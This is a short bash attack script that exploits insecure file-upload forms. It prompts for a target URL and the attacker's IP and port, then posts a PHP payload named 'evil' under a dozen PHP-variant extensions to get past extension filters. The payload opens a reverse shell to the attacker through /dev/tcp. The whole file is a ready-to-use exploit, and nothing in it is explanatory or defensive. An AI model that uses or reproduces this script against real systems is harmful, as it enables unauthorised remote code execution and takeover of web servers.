#!/bin/bash

echo -e "\nEnter the target URL:\n"
read url

echo -e "\nLook at a valid POST Request for reference. What is the value of the name attribute? (e.g. file for name=\"file\"):\n"
read name

if [ $# -lt 2 ]; then
  echo "The IP address & port weren't specified. Defaulting to interactive mode."

	# Continue with the rest of the script if 2 or more arguments are provided
	echo -e "\nEnter your IP Address:\n"
	read ip

	echo -e "\nEnter your listner's port:\n"
	read port
else
	ip=$1
	port=$2
fi

echo "IP: $ip"
echo "Port: $port"

# PHP payload to send as the file content
payload='<?php exec("/bin/bash -c '"'"'bash -i >& /dev/tcp/'"$ip"'/'"$port"' 0>&1'"'"'");?>'

# Extensions to try
extensions=(php php3 php4 php5 php7 pht phps phar phpt pgif phtml phtm inc)

for ext in "${extensions[@]}"; do
  boundary="-----------------------------$(date +%s%N | sha256sum | cut -c1-29)"
  filename="evil.$ext"

  echo "Uploading $filename..."

  curl -s -X POST "$url" \
    -H "Content-Type: multipart/form-data; boundary=$boundary" \
    --data-binary @<(cat <<EOF
--$boundary
Content-Disposition: form-data; name="$name"; filename="$filename"
Content-Type: application/php

$payload
--$boundary
Content-Disposition: form-data; name="submit"

Upload
--$boundary--
EOF
)
done

